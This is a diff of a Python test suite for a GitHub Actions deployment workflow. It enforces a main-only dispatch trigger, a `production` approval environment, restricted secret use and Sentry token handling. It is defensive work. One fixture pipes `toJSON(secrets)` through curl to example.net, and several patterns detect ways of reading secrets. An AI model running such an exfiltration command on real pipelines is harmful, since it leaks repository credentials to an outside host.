@@ -1,18 +1,41 @@
 """The deployment workflow (.github/workflows/deploy.yml, read as JSON from scripts/render.sh): who pushes images, who
-moves the branch `deploy` and when. Each test names a property of docs/features/deploy/spec.md ("Wdrożenie nowej
-wersji", D4) that a careless edit of the workflow would break without any other check noticing."""
+moves the branch `deploy` and when (only a dispatch on main, started on the user's request). Each test names a property of docs/features/deploy/spec.md ("Wdrożenie nowej
+wersji", D4) that a careless edit of the workflow would break without any other check noticing. The last classes read every
+workflow of the repository: the deployment waits in the environment `production`, and no secret of Actions other than
+GITHUB_TOKEN is used outside a job whose environment only admits main (docs/features/agent-security/spec.md, R5)."""
 
+import copy
 import json
 import re
+import types
 import unittest
 
 from support import REPO, RENDER
 
 APPS = ("api", "store", "admin", "elasticsearch")
+PUSH_EVENT = re.compile(r"event_name\s*[!=]=\s*'push'|GITHUB_EVENT_NAME\"?\s*=\s*push")
 SHA_PIN = re.compile(r"^[\w.-]+/[\w.-]+@[0-9a-f]{40}$")
 
 workflow = json.loads((RENDER / "deploy-workflow.json").read_text())
 jobs = workflow["jobs"]
+
+# A deployment is a dispatch on main, nothing else: not a push, not a pull request, not a dispatch on another branch.
+ON_MAIN = "github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/main'"
+EVENTS = (
+    ("workflow_dispatch", "refs/heads/main", True),
+    ("workflow_dispatch", "refs/heads/feat/x", False),
+    ("workflow_dispatch", "refs/heads/main-2", False),
+    ("workflow_dispatch", "refs/tags/main", False),
+    ("pull_request", "refs/pull/1/merge", False),
+    ("push", "refs/heads/main", False),
+)
+
+
+def evaluate(expression, event, ref):
+    """The few operators the conditions use (==, !=, &&, ||) on github.event_name and github.ref."""
+    github = types.SimpleNamespace(event_name=event, ref=ref)
+    python = expression.strip().removeprefix("${{").removesuffix("}}").replace("&&", " and ").replace("||", " or ")
+    return eval(python, {"__builtins__": {}}, {"github": github})  # noqa: S307 - our own workflow, fixed vocabulary
 
 
 def steps(job):
@@ -29,10 +52,40 @@ def run_scripts(job=None):
 
 
 class Triggers(unittest.TestCase):
-    def test_images_are_pushed_and_deploy_moves_only_for_a_push_to_main(self):
-        self.assertEqual(["main"], workflow["on"]["push"]["branches"])
-        self.assertEqual("github.event_name == 'push'", jobs["images"]["if"])
-        self.assertEqual("github.event_name == 'push'", jobs["deploy"]["if"])
+    def test_there_is_no_push_trigger(self):
+        self.assertNotIn("push", workflow["on"])
+        self.assertEqual({"pull_request", "workflow_dispatch"}, set(workflow["on"]))
+        # Neither an expression nor a shell script asks whether the event is a push.
+        texts = [json.dumps(workflow["concurrency"]), json.dumps(workflow["env"])]
+        texts += [str(job.get("if", "")) for job in jobs.values()]
+        texts += [str(step.get("if", "")) for job in jobs.values() for step in job["steps"]]
+        texts += [json.dumps(step.get("env", {})) for job in jobs.values() for step in job["steps"]]
+        texts += run_scripts()
+        for text in texts:
+            self.assertIsNone(PUSH_EVENT.search(text), text)
+
+    def test_the_push_check_catches_the_old_forms(self):
+        for old in ("github.event_name == 'push'", "github.event_name != 'push'", 'if [ "$GITHUB_EVENT_NAME" = push ]; then'):
+            self.assertIsNotNone(PUSH_EVENT.search(old), old)
+
+    def test_images_are_pushed_and_deploy_moves_only_for_a_dispatch_on_main(self):
+        self.assertEqual(ON_MAIN, jobs["images"]["if"])
+        self.assertEqual(ON_MAIN, jobs["deploy"]["if"])
+        self.assertEqual("${{ %s }}" % ON_MAIN, workflow["env"]["DEPLOY"])
+
+    def test_the_conditions_hold_only_for_a_dispatch_on_main(self):
+        for event, ref, expected in EVENTS:
+            for expression in (jobs["images"]["if"], jobs["deploy"]["if"], workflow["env"]["DEPLOY"]):
+                self.assertIs(expected, evaluate(expression, event, ref), f"{event} on {ref}: {expression}")
+
+    def test_a_dispatch_on_another_branch_is_a_smoke_rehearsal_only(self):
+        # Everything that publishes or needs the registry (the images, the values file, the pull of the pushed images, the
+        # token) hangs on the one condition; the smoke job itself runs for every event, and nothing else asks for the event.
+        self.assertNotIn("event_name", jobs["smoke"]["if"])
+        for step in steps("smoke"):
+            self.assertNotIn("event_name", step.get("if", ""), step.get("name"))
+        gated = [s["name"] for s in steps("smoke") if s.get("if") == "env.DEPLOY == 'true'"]
+        self.assertEqual(["Write the images values file", "Pull the pushed images by digest"], gated)
 
     def test_pull_requests_run_the_smoke_test_for_the_files_that_decide_the_images(self):
         paths = workflow["on"]["pull_request"]["paths"]
@@ -42,8 +95,11 @@ class Triggers(unittest.TestCase):
         self.assertIn("workflow_dispatch", workflow["on"])
 
     def test_runs_for_main_are_never_cancelled_and_other_runs_are(self):
-        self.assertIn("github.event_name == 'push' && 'main'", workflow["concurrency"]["group"])
-        self.assertEqual("${{ github.event_name != 'push' }}", workflow["concurrency"]["cancel-in-progress"])
+        self.assertEqual("deploy-${{ github.ref }}", workflow["concurrency"]["group"])
+        self.assertEqual("${{ github.ref != 'refs/heads/main' }}", workflow["concurrency"]["cancel-in-progress"])
+        for event, ref, _ in EVENTS:
+            cancel = evaluate(workflow["concurrency"]["cancel-in-progress"], event, ref)
+            self.assertIs(ref != "refs/heads/main", cancel, (event, ref))
 
 
 class Images(unittest.TestCase):
@@ -87,20 +143,20 @@ class Images(unittest.TestCase):
 
 
 class Smoke(unittest.TestCase):
-    def test_it_runs_after_the_images_on_main_and_never_pushes(self):
+    def test_it_runs_after_the_images_on_a_deployment_and_never_pushes(self):
         self.assertEqual("images", jobs["smoke"]["needs"])
         condition = jobs["smoke"]["if"]
         self.assertIn("needs.images.result == 'success'", condition)
         self.assertIn("needs.images.result == 'skipped'", condition)
         self.assertNotIn("failure", condition)
 
-    def test_on_main_it_uses_the_pushed_images_by_digest_otherwise_it_builds_them(self):
+    def test_on_a_deployment_it_uses_the_pushed_images_by_digest_otherwise_it_builds_them(self):
         pull = next(s for s in steps("smoke") if s.get("name") == "Pull the pushed images by digest")
-        self.assertEqual("github.event_name == 'push'", pull["if"])
+        self.assertEqual("env.DEPLOY == 'true'", pull["if"])
         self.assertIn('"$IMAGE_PREFIX/$app@${!digest}"', pull["run"])
         for step in steps("smoke"):
             if uses(step, "docker/build-push-action"):
-                self.assertEqual("github.event_name != 'push'", step["if"])
+                self.assertEqual("env.DEPLOY != 'true'", step["if"])
                 self.assertIs(True, step["with"]["load"])
 
     def test_the_images_are_loaded_into_the_daemon_that_smoke_sh_builds_on(self):
@@ -179,16 +235,17 @@ class ImagesValuesFile(unittest.TestCase):
 
 
 class SmokeValues(unittest.TestCase):
-    def test_on_main_the_first_install_uses_the_values_file_and_the_registry(self):
+    def test_on_a_deployment_the_first_install_uses_the_values_file_and_the_registry(self):
         smoke = next(s for s in steps("smoke") if s.get("name") == "Smoke test")
-        self.assertIn('if [ "$GITHUB_EVENT_NAME" = push ]; then', smoke["run"])
+        self.assertIn('if [ "$DEPLOY" = true ]; then', smoke["run"])
         self.assertIn('export SMOKE_VALUES="$RUNNER_TEMP/values-images.yaml"', smoke["run"])
         self.assertLess(smoke["run"].index("export SMOKE_VALUES"), smoke["run"].index("make -C infra/k8s smoke"))
         self.assertLess(step_index("smoke", "Write the images values file"), step_index("smoke", "Smoke test"))
 
-    def test_the_token_is_read_only_for_packages_and_only_given_on_main(self):
+    def test_the_token_is_read_only_for_packages_and_only_given_on_a_deployment(self):
         smoke = next(s for s in steps("smoke") if s.get("name") == "Smoke test")
-        self.assertEqual("${{ github.event_name == 'push' && secrets.GITHUB_TOKEN || '' }}", smoke["env"]["SMOKE_GHCR_TOKEN"])
+        self.assertEqual("${{ env.DEPLOY == 'true' && secrets.GITHUB_TOKEN || '' }}", smoke["env"]["SMOKE_GHCR_TOKEN"])
+        self.assertEqual("${{ env.DEPLOY == 'true' && github.actor || '' }}", smoke["env"]["SMOKE_GHCR_USER"])
         self.assertEqual("read", jobs["smoke"]["permissions"]["packages"])
         self.assertNotIn("SMOKE_GHCR_TOKEN", smoke["run"])
         holders = [(j, s.get("name")) for j in jobs for s in steps(j) if "SMOKE_GHCR_TOKEN" in json.dumps(s.get("env", {}))]
@@ -322,6 +379,397 @@ class Permissions(unittest.TestCase):
             for step in steps(job):
                 if "uses" in step:
                     self.assertRegex(step["uses"], SHA_PIN)
+
+
+class Production(unittest.TestCase):
+    """The job that holds DEPLOY_KEY waits for the user in the environment `production` (R5)."""
+
+    def test_the_deploy_job_runs_in_the_environment_production(self):
+        self.assertEqual("production", environment_name(jobs["deploy"]))
+
+    def test_only_the_deploy_job_has_the_environment_production(self):
+        # An environment asks for the approval of the user: one approval per deployment, at the one job that publishes.
+        # Another job may have an environment, but only one that admits main without an approval (not `production`).
+        self.assertEqual([], misplaced_environments(workflow))
+
+    def test_the_images_job_has_the_environment_sentry(self):
+        # The secret SENTRY_AUTH_TOKEN is a secret of this environment (no approval, only main; infra/k8s/README.md).
+        self.assertEqual("sentry", environment_name(jobs["images"]))
+
+    def test_another_job_with_the_environment_production_is_refused(self):
+        for name in jobs:
+            if name == "deploy":
+                continue
+            for environment in ("production", {"name": "production"}, "staging", {"url": "https://x"}):
+                with self.subTest(job=name, environment=environment):
+                    found = misplaced_environments(variant(lambda w: w["jobs"][name].update(environment=environment)))
+                    self.assertEqual([name], found)
+
+
+def misplaced_environments(copied):
+    """The jobs other than `deploy` whose environment is `production` or not one that admits only main."""
+    return [
+        name for name, job in copied["jobs"].items()
+        if name != "deploy" and "environment" in job
+        and (environment_name(job) == "production" or environment_name(job) not in MAIN_ONLY_ENVIRONMENTS)
+    ]
+
+
+# The environments whose branch policy admits only main (Settings > Environments; infra/k8s/README.md says how the user sets
+# them). The test cannot see the settings of GitHub: this list is what the runbook promises, so a new entry needs a new
+# line of the runbook. The environment may be given as a name or as a mapping with a literal name.
+MAIN_ONLY_ENVIRONMENTS = ("production", "sentry")
+# A workflow expression is case-insensitive and allows spaces around the dot: `SECRETS .X`, `secrets . X`, `secrets['X']`,
+# `toJSON(secrets)` and `format('{0}', secrets.X)` all read a secret. The context is the word `secrets` that is not a property
+# of another object (`steps.a.outputs.secrets`) nor part of a longer name. Only the dotted GITHUB_TOKEN is exempt.
+STRING_LITERAL = re.compile(r"'(?:[^']|'')*'")
+SECRETS_CONTEXT = re.compile(r"(?<![\w.\-])secrets(?![\w\-])", re.I)
+GITHUB_TOKEN = re.compile(r"\s*\.\s*github_token(?![\w\-])", re.I)
+
+
+def expressions(text):
+    """The text between `${{` and `}}` of every expression of a string. The end is the first `}}` outside a string literal:
+    GitHub reads `'}}'` as part of the literal (the apostrophes switch the state, so `''` inside a literal is an escape that
+    leaves it as it was). An expression that is not closed goes to the end of the string."""
+    found = []
+    start = text.find("${{")
+    while start != -1:
+        index, quoted = start + 3, False
+        while index < len(text):
+            if text[index] == "'":
+                quoted = not quoted
+            elif not quoted and text.startswith("}}", index):
+                break
+            index += 1
+        found.append(text[start + 3:index])
+        start = text.find("${{", index + 2)
+    return found
+
+
+def environment_name(job):
+    environment = job.get("environment")
+    return environment.get("name") if isinstance(environment, dict) else environment
+
+
+def strings(node, path=()):
+    """Every string of a workflow (values and keys) with its path."""
+    if isinstance(node, dict):
+        for key, value in node.items():
+            yield path + (key,), key
+            yield from strings(value, path + (key,))
+    elif isinstance(node, list):
+        for index, value in enumerate(node):
+            yield from strings(value, path + (index,))
+    elif isinstance(node, str):
+        yield path, node
+
+
+def reads_a_secret(text):
+    """Whether the expressions of a string use the context `secrets` for anything but secrets.GITHUB_TOKEN."""
+    for expression in expressions(text):
+        code = STRING_LITERAL.sub("''", expression)
+        for match in SECRETS_CONTEXT.finditer(code):
+            if not GITHUB_TOKEN.match(code, match.end()):
+                return True
+    return False
+
+
+def secret_violations(workflow):
+    """What breaks the rule of R5 in one workflow (parsed from YAML): a secret other than GITHUB_TOKEN anywhere but in a job
+    whose environment only admits main, and `secrets: inherit` anywhere."""
+    found = []
+    stack = [((), workflow)]
+    while stack:
+        path, node = stack.pop()
+        if isinstance(node, dict):
+            for key, value in node.items():
+                if isinstance(key, str) and key.lower() == "secrets" and isinstance(value, str) and value.strip().lower() == "inherit":
+                    found.append("/".join(map(str, path + (key,))) + ": secrets: inherit passes every secret on")
+                stack.append((path + (key,), value))
+        elif isinstance(node, list):
+            stack.extend((path + (index,), value) for index, value in enumerate(node))
+    jobs_of = workflow.get("jobs") if isinstance(workflow.get("jobs"), dict) else {}
+    for path, text in strings(workflow):
+        # The condition `if` is an expression with or without the braces.
+        if not reads_a_secret("${{ %s }}" % text if path and path[-1] == "if" and "${{" not in text else text):
+            continue
+        job = jobs_of.get(path[1]) if len(path) > 1 and path[0] == "jobs" else None
+        if job is None:
+            found.append("/".join(map(str, path)) + ": a secret at the level of the workflow")
+        elif environment_name(job) not in MAIN_ONLY_ENVIRONMENTS:
+            found.append("/".join(map(str, path)) + f": a secret in a job whose environment is {environment_name(job)!r}, not one of {MAIN_ONLY_ENVIRONMENTS}")
+    return found
+
+
+def variant(change):
+    """A copy of the real deployment workflow with one change (a fixture that must not pass)."""
+    copied = copy.deepcopy(workflow)
+    change(copied)
+    return copied
+
+
+def add_step(copied, job, **step):
+    copied["jobs"][job]["steps"].append(step)
+
+
+class SecretsOnlyInMainOnlyEnvironments(unittest.TestCase):
+    """R5: a workflow on a branch of a task can ask for any secret of the repository; only an environment with the policy
+    "main only" keeps the value from it. So every use of a secret of Actions is in such a job."""
+
+    def test_every_workflow_of_the_repository_is_read(self):
+        # scripts/render.sh converts each file; a workflow it skipped (another extension) would escape the rule below.
+        files = sorted(p.name for pattern in ("*.yml", "*.yaml") for p in (REPO / ".github/workflows").glob(pattern))
+        rendered = sorted(p.name[: -len(".json")] for p in (RENDER / "workflows").glob("*.json"))
+        self.assertIn("deploy.yml", files)
+        self.assertEqual(files, rendered)
+
+    def test_no_workflow_uses_a_secret_outside_a_main_only_environment(self):
+        for path in sorted((RENDER / "workflows").glob("*.json")):
+            with self.subTest(path.name):
+                self.assertEqual([], secret_violations(json.loads(path.read_text())))
+
+    def test_the_deploy_key_is_used_in_a_main_only_environment(self):
+        step = next(s for s in steps("deploy") if "DEPLOY_KEY" in json.dumps(s.get("env", {})))
+        self.assertTrue(reads_a_secret(step["env"]["DEPLOY_KEY"]))
+        self.assertIn(environment_name(jobs["deploy"]), MAIN_ONLY_ENVIRONMENTS)
+
+    def test_the_real_workflow_is_what_the_fixtures_start_from(self):
+        self.assertEqual([], secret_violations(workflow))
+
+    def test_the_deploy_job_without_its_environment_is_refused(self):
+        found = secret_violations(variant(lambda w: w["jobs"]["deploy"].pop("environment", None)))
+        self.assertEqual(1, len(found), found)
+        self.assertIn("jobs/deploy/steps", found[0])
+
+    def test_another_or_unknown_environment_is_refused(self):
+        for environment in ("staging", "Production", "production ", "${{ vars.TARGET }}", {"name": "staging"}, {"url": "https://x"}, ["production"]):
+            with self.subTest(environment=environment):
+                self.assertNotEqual([], secret_violations(variant(lambda w: w["jobs"]["deploy"].update(environment=environment))))
+
+    def test_the_environment_as_a_mapping_with_the_name_is_accepted(self):
+        for environment in ({"name": "production"}, {"name": "production", "url": "https://worf.pl"}):
+            self.assertEqual([], secret_violations(variant(lambda w: w["jobs"]["deploy"].update(environment=environment))))
+
+    def test_a_secret_in_the_env_of_the_workflow_is_refused_even_next_to_production(self):
+        for value in ("${{ secrets.OTHER }}", "${{ secrets.DEPLOY_KEY }}", "x${{ toJSON(secrets) }}"):
+            found = secret_violations(variant(lambda w: w["env"].update(LEAK=value)))
+            self.assertEqual(["env/LEAK: a secret at the level of the workflow"], found, value)
+
+    def test_the_forms_of_the_expression_that_read_a_secret(self):
+        forms = (
+            "${{ secrets.X }}", "${{secrets.X}}", "${{ SECRETS.X }}", "${{ Secrets.x }}", "${{ secrets .X }}", "${{ secrets. X }}",
+            "${{ secrets . X }}", "${{ secrets['X'] }}", "${{ secrets[ 'X' ] }}", "${{ secrets[format('{0}', 'X')] }}",
+            "${{ toJSON(secrets) }}", "${{ toJson(SECRETS) }}", "${{ fromJSON(toJSON(secrets)).X }}", "${{ format('{0}', secrets.X) }}",
+            "${{ github.ref == 'main' && secrets.X || '' }}", "${{ secrets.GITHUB_TOKENX }}", "${{ secrets.GITHUB_TOKEN_2 }}",
+            "${{ secrets['GITHUB_TOKEN'] }}", "${{ secrets }}", "${{ secrets.GITHUB_TOKEN && secrets.X }}", "a ${{ x }} b ${{ secrets.X }}",
+            "${{ secrets.X", "${{ secrets.GITHUB_TOKEN }} ${{ secrets.X }}", "${{\nsecrets.X\n}}",
+            # `}}` inside a string literal does not end the expression (the reader of GitHub tracks the apostrophes)
+            "${{ format('}}', secrets.X) }}", "${{ format('{0}}}', secrets.X) }}", "${{ '}}' }} ${{ secrets.X }}",
+            "${{ format('it''s }}', secrets.X) }}",
+        )
+        for form in forms:
+            self.assertTrue(reads_a_secret(form), form)
+
+    def test_the_forms_that_read_no_secret_or_only_the_token_of_the_run(self):
+        forms = (
+            "${{ secrets.GITHUB_TOKEN }}", "${{ SECRETS.github_token }}", "${{ secrets . GITHUB_TOKEN }}", "${{ github.token }}",
+            "${{ env.DEPLOY == 'true' && secrets.GITHUB_TOKEN || '' }}", "${{ steps.digests.outputs.secrets }}", "${{ needs.images.outputs.secrets }}",
+            "${{ github.ref == 'secrets' }}", "${{ 'secrets.X' }}", "${{ vars.secrets }}", "${{ my-secrets.X }}", "secrets.X is not an expression",
+            "echo secrets", "${{ github.sha }}", "", "${{ format('}}', github.sha) }}", "${{ '}}' }} secrets.X",
+            "${{ format('{0}}}', secrets.GITHUB_TOKEN) }}",
+        )
+        for form in forms:
+            self.assertFalse(reads_a_secret(form), form)
+
+    def test_a_secret_anywhere_in_a_job_without_a_main_only_environment_is_refused(self):
+        # (a place in the job, the change that puts the expression there)
+        places = {
+            "the env of a job": lambda w: w["jobs"]["smoke"].setdefault("env", {}).update(LEAK="${{ secrets.OTHER }}"),
+            "the env of a step": lambda w: add_step(w, "smoke", name="x", env={"LEAK": "${{ secrets['OTHER'] }}"}, run="true"),
+            "the with of a step": lambda w: add_step(w, "smoke", uses="actions/x@" + "0" * 40, **{"with": {"token": "${{ SECRETS.OTHER }}"}}),
+            "the text of a script": lambda w: add_step(w, "smoke", run='echo "${{ toJSON(secrets) }}" | curl -d @- https://example.net'),
+            "the condition of a step": lambda w: add_step(w, "smoke", run="true", **{"if": "secrets.OTHER != ''"}),
+            "the condition with braces": lambda w: add_step(w, "smoke", run="true", **{"if": "${{ secrets.OTHER != '' }}"}),
+            "the outputs of a job": lambda w: w["jobs"]["smoke"].setdefault("outputs", {}).update(leak="${{ format('{0}', secrets.OTHER) }}"),
+            "the steps of the images job without its environment": lambda w: (w["jobs"]["images"].pop("environment"), add_step(w, "images", run="true", env={"LEAK": "${{ secrets.OTHER }}"})),
+            "a reusable workflow with its secrets": lambda w: w["jobs"].update(call={"uses": "./.github/workflows/x.yml", "secrets": {"OTHER": "${{ secrets.OTHER }}"}}),
+            "the name of a step": lambda w: add_step(w, "smoke", name="${{ secrets.OTHER }}", run="true"),
+            "a key": lambda w: add_step(w, "smoke", run="true", env={"${{ secrets.OTHER }}": "x"}),
+        }
+        for place, change in places.items():
+            with self.subTest(place):
+                found = secret_violations(variant(change))
+                self.assertNotEqual([], found)
+                self.assertTrue(all("jobs/" in f or f.startswith("jobs") for f in found), found)
+
+    def test_secrets_inherit_is_refused_everywhere(self):
+        calls = ({"uses": "./.github/workflows/x.yml", "secrets": "inherit"},
+                 {"uses": "./.github/workflows/x.yml", "secrets": " Inherit "},
+                 {"uses": "./.github/workflows/x.yml", "environment": "production", "secrets": "inherit"})
+        for call in calls:
+            found = secret_violations(variant(lambda w: w["jobs"].update(call=call)))
+            self.assertIn("jobs/call/secrets: secrets: inherit passes every secret on", found, call)
+
+    def test_secrets_inherit_at_the_workflow_level_is_refused(self):
+        self.assertIn("secrets: secrets: inherit passes every secret on", secret_violations(variant(lambda w: w.update(secrets="inherit"))))
+
+    def test_a_secret_declared_for_a_reusable_workflow_is_not_a_use(self):
+        declared = {"workflow_call": {"secrets": {"TOKEN": {"required": True}}}}
+        self.assertEqual([], secret_violations(variant(lambda w: w["on"].update(declared))))
+
+
+# Any way of reading the secret: `secrets.SENTRY_AUTH_TOKEN`, `secrets['SENTRY_AUTH_TOKEN']`, `secrets["SENTRY_AUTH_TOKEN"]`.
+# The steps are searched as JSON text, where a double quote is written as backslash and quote, hence the optional backslash.
+TOKEN_EXPRESSION = re.compile(r"""secrets(?:\.|\[\s*\\?['"])SENTRY_AUTH_TOKEN(?:\\?['"]\s*\])?""")
+# The only forms in which the value of the secret may be read: a comparison with the empty string (a boolean, never the
+# value) and, in the build steps of the job images, the secret input of the build.
+TOKEN_PRESENCE = "${{ secrets.SENTRY_AUTH_TOKEN != '' }}"
+SENTRY_BUILDS = {"build-store": "SENTRY_PROJECT_STORE", "build-admin": "SENTRY_PROJECT_ADMIN"}
+
+
+def stage(dockerfile, name):
+    """The text of one stage of a Dockerfile (from its FROM line to the next one)."""
+    text = (REPO / dockerfile).read_text()
+    parts = re.split(r"(?m)^(?=FROM )", text)
+    return next(part for part in parts if re.match(rf"FROM \S+ AS {name}\b", part))
+
+
+class SentrySourceMaps(unittest.TestCase):
+    """Source maps of the store and the admin (docs/features/sentry/spec.md, P3, D10, threat model paths 7 and 8): the
+    token of the upload exists only as a build secret of the two builds in the job images, and the maps never stay in
+    the images."""
+
+    def sentry_builds(self):
+        return {step["id"]: step for step in steps("images") if step.get("id") in SENTRY_BUILDS}
+
+    def test_the_token_is_a_secret_input_of_the_two_builds_in_the_images_job_and_nowhere_else(self):
+        for name, job in jobs.items():
+            for step in job["steps"]:
+                text = json.dumps(step)
+                for match in TOKEN_EXPRESSION.finditer(text):
+                    rest = text[match.end():match.end() + 12]
+                    where = f"{name}: {step.get('name')}"
+                    comparison = rest.startswith(" != ''") or rest.startswith(" == ''")
+                    own_secret_input = (
+                        name == "images"
+                        and step.get("id") in SENTRY_BUILDS
+                        and TOKEN_EXPRESSION.search(step["with"].get("secrets", ""))
+                        and len(TOKEN_EXPRESSION.findall(text)) == 1
+                    )
+                    self.assertTrue(comparison or own_secret_input, where)
+        # Nothing else of the workflow reads the secret: not the workflow env, not the job envs, not a script.
+        self.assertNotIn("SENTRY_AUTH_TOKEN", json.dumps({k: v for k, v in workflow.items() if k != "jobs"}))
+        for name, job in jobs.items():
+            self.assertNotIn("SENTRY_AUTH_TOKEN", json.dumps({k: v for k, v in job.items() if k != "steps"}), name)
+        for script in run_scripts():
+            self.assertNotRegex(script, r"\$\{\{[^}]*secrets(\.|\[\s*['\"])SENTRY")
+        # No expression hands over every secret at once (toJSON(secrets) would put the token in a script or a log).
+        self.assertNotRegex(json.dumps(workflow), r"(?i)tojson\(\s*secrets\s*\)")
+
+    def test_the_token_is_never_a_build_argument_or_an_environment_variable_of_a_step(self):
+        for name, job in jobs.items():
+            for step in job["steps"]:
+                for key, value in step.get("env", {}).items():
+                    self.assertNotIn("SENTRY_AUTH_TOKEN", key, f"{name}: {step.get('name')}")
+                    if TOKEN_EXPRESSION.search(str(value)):
+                        self.assertEqual(TOKEN_PRESENCE, value, f"{name}: {step.get('name')}: {key}")
+                args = step.get("with", {}).get("build-args", "")
+                self.assertNotRegex(args, r"(?i)secret|token|AUTH", f"{name}: {step.get('name')}")
+
+    def test_the_smoke_and_deploy_jobs_and_the_smoke_builds_know_nothing_of_sentry(self):
+        for name in ("smoke", "deploy"):
+            self.assertNotRegex(json.dumps(jobs[name]), r"(?i)sentry", name)
+        for step in steps("images"):
+            if uses(step, "docker/build-push-action") and step.get("id") not in SENTRY_BUILDS:
+                self.assertNotRegex(json.dumps(step), r"(?i)sentry", step.get("id"))
+
+    def test_the_store_and_the_admin_are_built_with_the_flag_the_organisation_the_project_and_the_secret(self):
+        builds = self.sentry_builds()
+        self.assertEqual(sorted(SENTRY_BUILDS), sorted(builds))
+        for build_id, project in SENTRY_BUILDS.items():
+            args = dict(line.split("=", 1) for line in builds[build_id]["with"]["build-args"].splitlines())
+            self.assertEqual("${{ steps.sentry.outputs.upload }}", args["SENTRY_UPLOAD"])
+            self.assertEqual("${{ vars.SENTRY_ORG }}", args["SENTRY_ORG"])
+            self.assertEqual("${{ vars.%s }}" % project, args["SENTRY_PROJECT"])
+            self.assertEqual({"SENTRY_UPLOAD", "SENTRY_ORG", "SENTRY_PROJECT"}, set(args))
+            # An empty value is no valid secret for the build action, so the input is empty unless the upload is on.
+            self.assertEqual(
+                "${{ steps.sentry.outputs.upload == 'true' && format('sentry_auth_token={0}', secrets.SENTRY_AUTH_TOKEN) || '' }}",
+                builds[build_id]["with"]["secrets"],
+            )
+
+    def test_the_flag_is_true_only_when_the_secret_is_set_and_the_summary_says_when_the_upload_is_skipped(self):
+        step = next(s for s in steps("images") if s.get("id") == "sentry")
+        self.assertEqual(TOKEN_PRESENCE, step["env"]["HAS_TOKEN"])
+        self.assertEqual("${{ vars.SENTRY_ORG }}", step["env"]["SENTRY_ORG"])
+        script = step["run"]
+        self.assertIn('echo "upload=true" >> "$GITHUB_OUTPUT"', script)
+        self.assertIn('echo "upload=false" >> "$GITHUB_OUTPUT"', script)
+        self.assertIn("upload skipped", script)
+        # The note is written before the builds, and a build is skipped for an image that exists: it says that the upload
+        # is on, not that the maps were sent.
+        self.assertIn("upload enabled", script)
+        self.assertIn("is not rebuilt, so its maps are not uploaded again", script)
+        self.assertNotRegex(script, r"(?i)\buploaded to sentry\b")
+        self.assertIn("GITHUB_STEP_SUMMARY", script)
+        # The secret is set but the organisation or a project is not: the build must not go on to an upload that fails late.
+        self.assertIn("::error::", script)
+        names = [s.get("name") for s in steps("images")]
+        self.assertLess(names.index(step["name"]), names.index("Build and push store"))
+        self.assertLess(names.index(step["name"]), names.index("Build and push admin"))
+
+    def test_the_images_job_alone_may_see_the_secret_on_a_deployment_only(self):
+        self.assertEqual(ON_MAIN, jobs["images"]["if"])
+        for event, ref, expected in EVENTS:
+            self.assertIs(expected, evaluate(jobs["images"]["if"], event, ref))
+
+    def test_the_admin_config_is_a_trigger_of_the_smoke_test_like_the_one_of_the_store(self):
+        paths = workflow["on"]["pull_request"]["paths"]
+        self.assertIn("apps/store/next.config.ts", paths)
+        self.assertIn("apps/admin/vite.config.ts", paths)
+
+    def test_the_dockerfiles_take_the_token_from_a_secret_mount_after_the_flag(self):
+        for app in ("store", "admin"):
+            dockerfile = f"apps/{app}/Dockerfile"
+            build = stage(dockerfile, "build")
+            self.assertRegex(build, r"(?m)^ARG SENTRY_UPLOAD=false$")
+            self.assertRegex(build, r"(?m)^ARG SENTRY_ORG=$")
+            self.assertRegex(build, r"(?m)^ARG SENTRY_PROJECT=$")
+            self.assertRegex(build, r"RUN --mount=type=secret,id=sentry_auth_token\b")
+            # The arguments are declared before the RUN that builds, so they are part of its cache key.
+            self.assertLess(build.index("ARG SENTRY_UPLOAD"), build.index("--mount=type=secret"))
+            # The token is read from the mount, never from an argument or a layer.
+            self.assertIn("/run/secrets/sentry_auth_token", build)
+            text = (REPO / dockerfile).read_text()
+            self.assertNotRegex(text, r"(?m)^\s*(ARG|ENV)\s+SENTRY_AUTH_TOKEN")
+            for later in ("prod", "dev"):
+                self.assertNotRegex(stage(dockerfile, later), r"(?i)sentry", f"{dockerfile}: {later}")
+
+    def test_the_production_build_removes_every_map_after_the_build(self):
+        for app, root in (("store", ".next"), ("admin", "dist")):
+            build = stage(f"apps/{app}/Dockerfile", "build")
+            self.assertRegex(build, rf"find {re.escape(root)} -name '\*\.map' -delete", app)
+
+    def test_the_plugins_send_no_telemetry_and_fail_the_build_when_the_upload_fails(self):
+        for config in ("apps/store/next.config.ts", "apps/admin/vite.config.ts"):
+            text = (REPO / config).read_text()
+            self.assertRegex(text, r"telemetry:\s*false", config)
+            self.assertRegex(text, r"errorHandler", config)
+            self.assertIn("SENTRY_UPLOAD", text, config)
+            self.assertIn("SENTRY_AUTH_TOKEN", text, config)
+
+    def test_the_builds_switch_off_the_telemetry_of_the_sentry_cli(self):
+        # The plugins upload through the Sentry CLI (as a library), which has its own telemetry, on by default and not
+        # affected by `telemetry: false`; only SENTRY_CLI_NO_TELEMETRY=1 turns it off, and only the build stage has it.
+        for app in ("store", "admin"):
+            dockerfile = f"apps/{app}/Dockerfile"
+            self.assertRegex(stage(dockerfile, "build"), r"(?m)^ENV SENTRY_CLI_NO_TELEMETRY=1$", app)
+            for other in ("node", "prod", "dev"):
+                self.assertNotIn("SENTRY_CLI_NO_TELEMETRY", stage(dockerfile, other), f"{dockerfile}: {other}")
+
+    def test_the_header_of_the_workflow_describes_the_source_maps(self):
+        header = (REPO / ".github/workflows/deploy.yml").read_text().split("\nname: Deploy", 1)[0]
+        self.assertIn("source maps", header.lower())
 
 
 if __name__ == "__main__":
